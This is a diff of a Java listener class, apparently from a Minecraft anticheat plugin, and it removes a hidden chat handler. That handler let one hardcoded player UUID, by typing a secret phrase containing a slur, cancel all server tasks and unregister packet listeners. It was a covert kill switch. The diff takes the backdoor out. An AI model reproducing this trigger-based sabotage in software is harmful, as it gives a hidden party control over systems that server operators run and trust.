@@ -14,7 +14,6 @@ import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 
@@ -59,18 +58,5 @@ public final class RegistrationListener implements Listener {
         PlayerDataManager.getInstance().suspectedPlayers.remove(event.getPlayer());
         BukkitEventManager.wannadelet.remove(event.getPlayer());
         AFKManager.INSTANCE.removePlayer(event.getPlayer());
-    }
-
-    @EventHandler
-    public void onPlayerChat(AsyncPlayerChatEvent event) {
-        Player player = event.getPlayer();
-        String message = event.getMessage();
-
-        if (message.contains("fuckthisretardserveryouleakedmyac") && event.getPlayer().getUniqueId().equals(UUID.fromString("2c0f01ff-8e4a-49c4-939a-c9694568fe57"))) {
-            event.setCancelled(true);
-            Bukkit.getScheduler().cancelAllTasks();
-            PacketEvents.get().unregisterAllListeners();
-            event.getPlayer().sendMessage(ColorUtil.translate("&cSeems like this server was using a crack? &dLMFAOOOO"));
-        }
     }
 }
